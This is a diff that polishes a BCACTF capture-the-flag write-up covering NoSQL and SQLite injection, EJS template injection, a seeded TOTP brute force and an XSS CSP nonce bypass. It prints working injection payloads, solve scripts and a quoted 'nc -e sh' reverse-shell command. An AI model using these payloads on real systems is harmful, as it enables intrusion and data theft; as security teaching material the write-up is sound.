@@ -57,7 +57,7 @@ Joining all the parts we get our flag
 > **Description** : My friend wrote this super cool game of tic-tac-toe. It has an AI he claims is unbeatable. I've been playing the game for a few hours and I haven't been able to win. Do you think you could beat the AI?\
 > **Author** : `Thomas`
 
-* As we open the link we can see a tic-tac-toe game.
+* As we open the link, we can see a tic-tac-toe game.
 
 ![index](./images/bcactf/tictactoe/index.png)
 
@@ -65,13 +65,12 @@ Joining all the parts we get our flag
 
 ![intercept](./images/bcactf/tictactoe/intercept.png)
 
-* As we can see, a WebSocket request is being sent to the server with the current position marked by us on the board and a response from the server with the server's move. So, if we modify the request at the position when we are just a step before winning, we can win the game and get the flag.
+* As we can see, a WebSocket request is being sent to the server with the current position marked by us on the board, and a response from the server with the server's move. So, if we modify the request at the position when we are just a step before winning, we can win the game and get the flag.
 
 ![response](./images/bcactf/tictactoe/response.png)
 
-* Let's change this so that we can win the game
-
-Modified response: 
+* Let's change this so that we can win the game.
+Modified response:
 
 ![modified](./images/bcactf/tictactoe/modified.png)
 
@@ -90,14 +89,15 @@ Now the board looks like this:
 > **Description** : I found this database that does not use SQL, is there any way to break it?\
 > **Author**: `Jack`
 
-* As per name and description it is almost clear that it is a challenge with no sql injection vulnerability.
+* From the name and description, it is almost clear that this challenge involves no SQL injection vulnerability.
 
-* Opening the challenge url we can't see much there.
-Just a simple response `Not a valid query :(`
+* Opening the challenge URL doesn't reveal much.
+We only see a simple response: `Not a valid query :(`
 
 ![index](./images/bcactf/nosql/index.png)
 
-* We are also provided with the server side code this time.
+* We are also provided with the server-side code this time.
+
 
 ```js
 const express = require('express')
@@ -137,17 +137,18 @@ app.listen(port, () => {
 });
 ```
 
-* Trying simple inection in the query parameter name `abc' || 'a'=='a` we get the whole table with the first and last names.
+* Attempting a simple injection in the query parameter name `abc' || 'a'=='a` returns the entire table with first and last names.
 
 ![list](./images/bcactf/nosql/list.png)
 
-* In the hints it is mentioned that the id of `Ricardo Olsen` is 1.
+* The hints indicate that the ID of `Ricardo Olsen` is 1.
 
-* As a guess we can try counting the number of entries in the table to get the id of `Flag Holder` (Last entry in the table).
+* As a hypothesis, we can try counting the number of entries in the table to determine the ID of `Flag Holder` (the last entry in the table).
 
 ![length](./images/bcactf/nosql/length.png)
 
-So there are 51 entries in the table and as per the source code `/:id/:firstName/:lastName` will give us the flag if :
+There are 51 entries in the table, and according to the source code, `/:id/:firstName/:lastName` will provide the flag if:
+
 ```
 id = 51
 firstName = Flag
@@ -301,24 +302,25 @@ if __name__ == '__main__':
     app.run()
 ``` 
 
-* As we can see the app is simple and it has a 2FA system for verification.
+* As we can see, the app is simple and includes a 2FA system for verification.
 
-* It has a random topt secret generated and it verifies the otp with every login.
+* It generates a random TOTP secret and verifies the OTP with every login.
 
-* But wait is the totp secret random everytime it is generated?
+* But wait, is the TOTP secret randomly generated every time?
 
 * The answer is no.
-Let's look at this particular line of code
+Let's look at this particular line of code.
 
 ```python
 random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))
 ```
 
-* The seed of the random is fixed for a particular date and the description also talks about the final days of the last month (May).
+* The seed of the random number generator is fixed for a particular date, and the description also refers to the final days of the last month (May).
 
-* To solve this challenge I wrote a script which tries every totp for each date of May 2024.
+* To solve this challenge, I wrote a script that tries every TOTP for each date in May 2024.
 
 * Script to solve the challenge:
+
 ```python
 import datetime
 import random
@@ -356,15 +358,15 @@ for i in range(1,32):
 > **Description** : You need to get 1e20 cookies, hope you have fun clicking! \
 > **Author** : `Jack`
 
-* As per the description it looks like we have to click the cookie 1e20 time which is obviously not possible manually.
+* As per the description, it looks like we have to click the cookie 1e20 times, which is obviously not possible manually.
 
 * Let's intercept the request and increase the value of power.
 
 ![Power](./images/bcactf/cookie/power.png)
 
-* As expected the value of cookie increased but wait why didn't we get the flag.
+* As expected, the value of the cookie increased, but wait, why didn't we get the flag?
 
-* When we click on the cookie again we can see an error message coming from the server.
+* When we click on the cookie again, we can see an error message coming from the server.
 
 ![error](./images/bcactf/cookie/error.png)
 
@@ -422,21 +424,23 @@ const server = app.listen(0, () => console.log(server.address().port))
 
 ![index](./images/bcactf/duck/index.png)
 
-* As per the source code the app is a searching enginer for breed and if the breed matches from the list it provides us the summary.
+* According to the source code, the app functions as a search engine for breeds, and if the breed matches an entry from the list, it provides a summary.
 
-* If we see the .ejs files we can see the breed parameter is simply passed into the page and rendered. So ssti was the first though and initially I was trying to modify the `notFound` varaible to false with the help of prototype pollution in the `express@4.18.2` pacakge as breed gets rendered only when `notFound` = `false`. But this approach failed.
+* By examining the .ejs files, we can see that the breed and summary parameters are simply passed into the page and rendered. This led me to initially consider SSTI (Server-Side Template Injection). I first attempted to modify the `notFound` variable to false through prototype pollution in the `express@4.18.2` package, since the breed only gets rendered when `notFound` is set to `false`. However, this approach failed.
 
-* The next interesting part is the package `ejs@3.1.6`. It is vulnerable to ssti and here is the poc available online. [POC](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
+* Another intriguing aspect is the `ejs@3.1.6` package. It is vulnerable to SSTI, and here is a POC available online: [POC](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
+
 
 ```js
 settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
 ```
 
-* This was the payload available in the poc but the challenge had no network access so we can't get reverse shell.
+* This was the payload available in the PoC, but the challenge had no network access, so we couldn't get a reverse shell.
 
-* But we can see in the poc the `__append` function can be used to render something back on the html.
+* However, in the PoC, we observed that the `__append` function can be used to render something back in the HTML.
 
-* Hence we used this approach to get the flag.
+* Therefore, we used this approach to retrieve the flag.
+
 ```
 Final Payload = breed=Pekin&settings[view options][outputFunctionName]=x;var flag = Deno.env.get('FLAG');__append(flag);s
 ```
@@ -452,13 +456,15 @@ Final Payload = breed=Pekin&settings[view options][outputFunctionName]=x;var fla
 > **Author** : `Jacob Korn`
 
 ![index](./images/bcactf/gring/index.png)
-* As per the description and hint it's a sql injection challenge in sqlite. But the problem is it spilts the input by whitespaces. So we have to bypass this somehow.
 
-* /**/ will not work for this challenge as the searching parameter directly goes into the route and it will respond with a 404 error.
+* This is a SQL injection challenge in SQLite. The input is split by whitespaces, so we need to bypass this restriction.
 
-* But we can easily bypass this with tabspace (%09) `\t` or new line character (%0A) `\n` url encoded 
+* Note that using comments (/**/) will not work for this challenge, as the search parameter is directly included in the route, resulting in a 404 error.
 
-So to list the tables we can use the payload as
+* Instead, we can bypass this restriction by using tab space (%09) `\t` or newline character (%0A) `\n` URL encoded.
+
+* To list the tables, we can use the payload as follows:
+
 ```sql
 random'UNION%0ASELECT%0Aname%0AFROM%0Asqlite_master%0AWHERE%0Atype='table'--
 ```
@@ -482,16 +488,17 @@ random'UNION%0ASELECT%0A*%0AFROM%0Aflag--
 
 ![index](./images/bcactf/user/index.png)
 
-As we can see we can change the username and as per hints it uses UPDATE statement and we can inject in it.
+* As we can see, we can change the username. According to the hints, this uses an UPDATE statement, which makes it susceptible to injection attacks.
 
-Probably the app is using this query
+* The application is probably using this query.
+
 ```sql
 UPDATE users SET name="<input>" WHERE id=1;
 ```
 
-So we tried to exploit and display the results in the name field.
+* So we tried to exploit and display the results in the name field.
 
-Here are some payloads and their output
+* Here are some payloads and their output
 
 ```
 1. Payload: ",name=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')--
@@ -509,37 +516,33 @@ Similarly
    CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT NOT NULL)
 ```
 
-* So let's discuss the results now. We have two tables users and roles_eab48ad667ed5a02.
-The database gets reset every 15 minutes.
+* Let's discuss the results with two tables: users and roles_eab48ad667ed5a02. The database resets every 15 minutes.
 
-* The users table has two columns name and id.
-id = 0 is assigned to a name and as per the structure of the table `PRIMARY KEY` is used for the column id which means we can't change the id to an existing value in this table. So as 0 is assigned to a name hence we directly can't change the value to 0
+* The users table contains two columns: name and id. The id = 0 is assigned to a name, and the table structure uses `PRIMARY KEY` for the id column, meaning we can't change the id to an existing value in this table. Since 0 is assigned to a name, we can't directly change the value to 0.
 
-* The second table (roles_44f63838742cf87d) is interesting. It has two columns admin and id.
-for `id = 0 admin = 1 `and for `id = 1 admin = 0`.
-So now it makes clear that only users with id = 0 have admin access.
+* The second table (roles_44f63838742cf87d) is intriguing. It has two columns: admin and id. For id = 0, admin = 1, and for id = 1, admin = 0. This indicates that only users with id = 0 have admin access.
 
-* So if we can make our id = 0 we can get admin access or we can make admin = 1 for id = 1.
+* Now, if we can change our id to 0, we can gain admin access, or we can set admin = 1 for id = 1.
 
-* Here is the interesting part `(id INTEGER, admin INTEGER, FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE)`. This part tells us that the users table is the parent table and holds a foreign key realtion with its child table. So if we change the value of id in the users table it will automatically change the value in the roles table.
+* Here is the interesting part: `(id INTEGER, admin INTEGER, FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE)`. This part tells us that the users table is the parent table and holds a foreign key relation with its child table. So, if we change the value of id in the users table, it will automatically change the value in the roles table.
 
-* So if we first make id = 0 to id = 3 in users table then we have id = 3 as admin = 1.
-Now if we change id = 1 to id = 5 we have id = 5 as admin = 0 in the roles table. And now finally if we change the id = 3 back to id = 1 then id = 1 will have admim = 1 which simply meanse we have admin role.
+* So, if we first change id = 0 to id = 3 in the users table, then we have id = 3 with admin = 1. Now, if we change id = 1 to id = 5, we have id = 5 with admin = 0 in the roles table. Finally, if we change id = 3 back to id = 1, then id = 1 will have admin = 1, which simply means we have admin role.
 
-* But here is a twist when you change the id = 1 to id = 5 the cookie will gets reset as it is menitoned you will always have id = 1. So we have to make sure that cookie doesn't change while doing so.
+* But there's a twist: when you change id = 1 to id = 5, the cookie will reset, as it is mentioned that you will always have id = 1. So, we have to ensure that the cookie doesn't change while doing so.
 
-* So let's start exploiting
+Let's start exploiting:
+
 1. `",id = 3 WHERE id = 0;--`
 
-    Now save the cookie somewhere
+   Save the cookie somewhere.
 
 2. `",id = 5 WHERE id = 1;--`
 
-    Put back the old cookie back
+   Put back the old cookie.
 
 3. `",id = 1 WHERE id = 3;--`
 
-* And we will get the flag in response
+And we will get the flag in response.
 
 ![flag](./images/bcactf/user/flag.png)
 
@@ -552,15 +555,15 @@ Now if we change id = 1 to id = 5 we have id = 5 as admin = 0 in the roles table
 
 ![index](./images/bcactf/transcript/index.png)
 
-* This was an XSS challenge with CSP bypass. The app is simple it generates transcripts with some parameters. The interesting parameter is name as it is directly passed into the html which leaves a risk of xss.
+* This was an XSS challenge with a CSP bypass. The application is straightforward: it generates transcripts with some parameters. The parameter of interest is 'name', as it is directly passed into the HTML, leaving a risk of XSS.
 
 * `Content-Security-Policy: default-src 'self'; script-src 'nonce-MTcxODA0MTEwMDAwMA=='`
 
-* As we can see we have to send a Nonce value with the scipt taq to execute it and the nonce value can be easily bypassed as it is the base64 of timestamp of the time of request.
+* As we can see, we need to send a nonce value with the script tag to execute it, and the nonce value can be easily bypassed since it is the base64 of the timestamp of the request.
 
-* As per the author the flag was in localstorage so we have to include the flag in the pdftranscript url and see the pdf to get the flag.
+* According to the author, the flag was stored in local storage, so we have to include the flag in the PDF transcript URL and view the PDF to retrieve the flag.
 
-* To meet these requirements we made a script which can include the correct Nonce in our request.
+* To meet these requirements, we created a script that can include the correct nonce in our request.
 
 ```python
 import requests
@@ -585,7 +588,7 @@ with open("test.pdf", "wb") as pdf:
 print("PDF Saved")
 ```
 
-* We have to try 2 3 times as sometimes nonce value is a bit different in miliseconds.
+* We might need to try 2-3 times since sometimes the nonce value differs by a few milliseconds.
 
 ![flag](./images/bcactf/transcript/flag.png)
 
